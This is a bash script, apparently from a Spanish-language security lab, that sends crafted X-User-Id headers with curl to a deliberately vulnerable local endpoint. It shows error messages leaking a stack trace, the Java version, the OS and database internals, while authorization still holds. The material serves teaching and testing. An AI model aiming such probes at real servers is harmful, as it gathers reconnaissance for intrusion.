#!/bin/bash
echo "=== Exceptions Partial (info-leak): Fuga de información interna ==="
echo ""
echo "En este estado la autorización ES correcta (fail-closed)."
echo "Pero los mensajes de error exponen información interna del servidor."
echo ""

echo "--- Ataque 1: input no numérico ('abc') → stack trace + serverInfo ---"
curl -s -H "X-User-Id: abc" \
  http://localhost:8080/api/exceptions/partial-info-leak/admin/config | python -m json.tool

echo ""
echo "Resultado esperado: ATTACK_SUCCESS — versión Java, OS y user.dir expuestos"
echo ""

echo "--- Ataque 2: ID inexistente (999) → nombre de tabla y datasource ---"
curl -s -H "X-User-Id: 999" \
  http://localhost:8080/api/exceptions/partial-info-leak/admin/config | python -m json.tool

echo ""
echo "Resultado esperado: ATTACK_SUCCESS — estructura interna de BD expuesta"
echo ""

echo "--- Comparación: usuario sin privilegios (roberto, id=2) → 403 genérico ---"
curl -s -H "X-User-Id: 2" \
  http://localhost:8080/api/exceptions/partial-info-leak/admin/config | python -m json.tool
echo "Resultado esperado: ATTACK_BLOCKED con mensaje genérico (sin info extra)"
